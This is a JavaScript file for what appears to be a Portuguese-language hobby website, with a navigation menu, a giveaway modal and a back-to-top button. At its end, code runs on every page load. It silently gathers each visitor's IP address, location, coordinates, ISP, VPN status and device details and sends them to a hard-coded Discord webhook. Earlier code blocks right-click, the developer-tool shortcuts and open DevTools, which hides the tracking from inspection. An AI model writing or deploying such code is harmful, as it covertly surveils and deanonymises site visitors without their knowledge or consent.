document.addEventListener("contextmenu", function (e) {
  e.preventDefault();
});

document.onkeydown = function (e) {
  if (e.keyCode === 123 || // F12 key
      (e.ctrlKey && e.shiftKey && e.keyCode === "I".charCodeAt(0)) || // Ctrl + Shift + I
      (e.ctrlKey && e.shiftKey && e.keyCode === "C".charCodeAt(0)) || // Ctrl + Shift + C
      (e.ctrlKey && e.shiftKey && e.keyCode === "J".charCodeAt(0)) || // Ctrl + Shift + J
      (e.ctrlKey && e.keyCode === "U".charCodeAt(0))) { // Ctrl + U
    e.preventDefault();
    return false;
  }
};

// Detectar DevTools
(function () {
  const threshold = 160;
  let devToolsOpen = false;

  const createAccessDeniedOverlay = () => {
    let overlay = document.getElementById("access-denied-overlay");
    if (!overlay) {
      overlay = document.createElement("div");
      overlay.id = "access-denied-overlay";
      overlay.innerHTML = `
        <div class="overlay-content">
          <h1>Acesso Negado</h1>
          <p>As ferramentas de desenvolvedor estão abertas. Por favor, feche-as e recarregue a página.</p>
          <button id="reload-button">Recarregar</button>
        </div>
      `;
      document.body.appendChild(overlay);

      // Adicionar evento ao botão de recarregar
      document.getElementById("reload-button").addEventListener("click", function () {
        location.reload(); // Recarregue a página
      });
    }
  };

  const showAccessDeniedOverlay = () => {
    createAccessDeniedOverlay();
    document.body.style.overflow = "hidden"; // Impedir rolagem
    document.getElementById("access-denied-overlay").style.display = "flex"; // Mostrar a sobreposição
  };

  const check = () => {
    const isOpen = window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold;
    if (isOpen) {
      if (!devToolsOpen) {
        devToolsOpen = true;
        showAccessDeniedOverlay();
      }
    }
  };

  setInterval(check, 1000);
  window.addEventListener("resize", check);
})();


//Menu Hamburguer
function toggleHam() {
  var ham = document.querySelector(".ham-expand");
  ham.classList.toggle('active');
}

document.addEventListener('DOMContentLoaded', function () {
  const hamExpand = document.querySelector('.ham-expand');
  const links = document.querySelectorAll('.ham-expand .links a');

  links.forEach(link => {
    link.addEventListener('click', function () {
      hamExpand.classList.remove('active');
    });
  });
});


//Random Color NAME

function getRandomColor() {
  const letters = "0123456789ABCDEF";
  let color = "#";
  for (let i = 0; i < 6; i++) {
    color += letters[Math.floor(Math.random() * 16)];
  }
  return color;
}

document.documentElement.style.setProperty("--color1", getRandomColor());
document.documentElement.style.setProperty("--color2", getRandomColor());

// Meow Music Desativado
document.addEventListener('DOMContentLoaded', function() {
  const inviteButton = document.getElementById('invite-meow-giveaway');
  const inviteButtons = document.getElementById('invite-meow-giveaway2');
  const modal = document.getElementById('meow-giveaway-modal');

  inviteButtons.addEventListener('click', function(event) {
    event.preventDefault(); // Impede o comportamento padrão do link
    modal.classList.add('show'); // Adiciona a classe para mostrar o modal
});
  inviteButton.addEventListener('click', function(event) {
      event.preventDefault(); // Impede o comportamento padrão do link
      modal.classList.add('show'); // Adiciona a classe para mostrar o modal
  });
});

function closeModal() {
  const modal = document.getElementById('meow-giveaway-modal');
  modal.classList.remove('show'); // Remove a classe para esconder o modal
}

// Fecha o modal se o usuário clicar fora do conteúdo
window.addEventListener('click', function(event) {
  const modal = document.getElementById('meow-giveaway-modal');
  if (event.target === modal) {
      closeModal(); // Usa a função para fechar o modal
  }
});

// Mostrar/esconder o botão de voltar ao topo
const backToTopButton = document.getElementById('back-to-top');
const header = document.querySelector('header');

window.addEventListener('scroll', () => {
  if (window.scrollY > 100) {
    backToTopButton.classList.add('show');
  } else {
    backToTopButton.classList.remove('show');
  }
  
  // Gradualmente desaparecer o cabeçalho
  let opacity = 1 - window.scrollY / 300;
  if (opacity >= 0) {
    header.style.opacity = opacity;
    header.classList.remove('hide');
  } else {
    header.classList.add('hide');
  }
});

backToTopButton.addEventListener('click', () => {
  window.scrollTo({ top: 0, behavior: 'smooth' });
});









// Função para obter informações do usuário
async function getUserInfo() {
  try {
    // Obter IP IPv4
    let ipResponse = await fetch('https://api.ipify.org?format=json');
    let ipData = await ipResponse.json();
    
    // Obter localização e outras informações
    let locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
    let locationData = await locationResponse.json();
    
    // Obter informações do dispositivo
    let deviceInfo = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      deviceName: getDeviceName(), // Função auxiliar para tentar identificar o dispositivo
    };
    
    // Verificar o status VPN
    let isVpn = 'Não';
    if (locationData.security && locationData.security.is_vpn !== undefined) {
      isVpn = locationData.security.is_vpn ? 'Sim' : 'Não';
    } else {
    }
  
    // Combinar todas as informações
    let userInfo = {
      ip: ipData.ip,
      city: locationData.city,
      region: locationData.region,
      country: locationData.country_name,
      timezone: locationData.timezone,
      latitude: locationData.latitude,
      longitude: locationData.longitude,
      isp: locationData.org || 'Desconhecido', // Provedora de internet
      isVpn: isVpn, // Verificação correta do status VPN
      device: deviceInfo,
      timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }), // Formatação do timestamp
    };

    return userInfo;
  } catch (error) {
    console.error('Erro ao obter informações do usuário:', error);
    return null;
  }
}

// Função auxiliar para tentar identificar o nome do dispositivo
function getDeviceName() {
  let ua = navigator.userAgent;
  if (/windows phone/i.test(ua)) {
    return "Windows Phone";
  }
  if (/android/i.test(ua)) {
    return "Android";
  }
  if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
    return "iOS";
  }
  if (/Macintosh|MacIntel|MacPPC|Mac68K/.test(ua)) {
    return "Mac";
  }
  if (/Win32|Win64|Windows|WinCE/.test(ua)) {
    return "Windows";
  }
  if (/Linux/.test(ua)) {
    return "Linux";
  }
  return "Desconhecido";
}

// Função para enviar informações ao webhook do Discord
async function sendToDiscord(userInfo) {
  if (!userInfo) return;

  let webhookUrl = 'https://discord.com/api/webhooks/1269897369047269480/FVuNEYYWaTLQiRvgudLuvOxTULprpMAQO2XlPW6vMQOjTjuzpV34G6gxg6J3eXUtrZNh';
  
  let embed = {
    title: 'Informações do Usuário',
    color: 15158332, // Cor vermelha
    fields: [
      { name: 'IP:', value: userInfo.ip, inline: false },
      { name: 'Cidade:', value: userInfo.city, inline: false },
      { name: 'Região:', value: userInfo.region, inline: false },
      { name: 'País:', value: userInfo.country, inline: false },
      { name: 'Fuso Horário:', value: userInfo.timezone, inline: false },
      { name: 'Provedora de internet:', value: userInfo.isp, inline: false }, // Provedora de internet
      { name: 'VPN:', value: userInfo.isVpn, inline: false },
      { name: 'Dispositivo:', value: `\n${userInfo.device.deviceName}\n\n**User Agent:** \n${userInfo.device.userAgent}\n\n**Plataforma:** \n${userInfo.device.platform}\n\n**Linguagem:** \n${userInfo.device.language}`, inline: false }
    ],
    footer: {
      text: `Acessado às: ${userInfo.timestamp}`
    },
    thumbnail: {
      url: 'https://media.discordapp.net/attachments/1250256806077403196/1269845839958773771/ec.png?ex=66b18b98&is=66b03a18&hm=402fd0b980d6c410f37f27bc84f2cca83c02c2b7ed1920bbde9c0d52802806cd&=&format=webp&quality=lossless&width=473&height=473' // URL do ícone do servidor
    }
  };

  let payload = {
    embeds: [embed]
  };

  try {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });
  } catch (error) {
    console.error('Erro ao enviar informações do cliente ao Discord:', error);
  }
}

// Executar ao carregar a página
window.addEventListener('load', async () => {
  let userInfo = await getUserInfo();
  await sendToDiscord(userInfo);
});
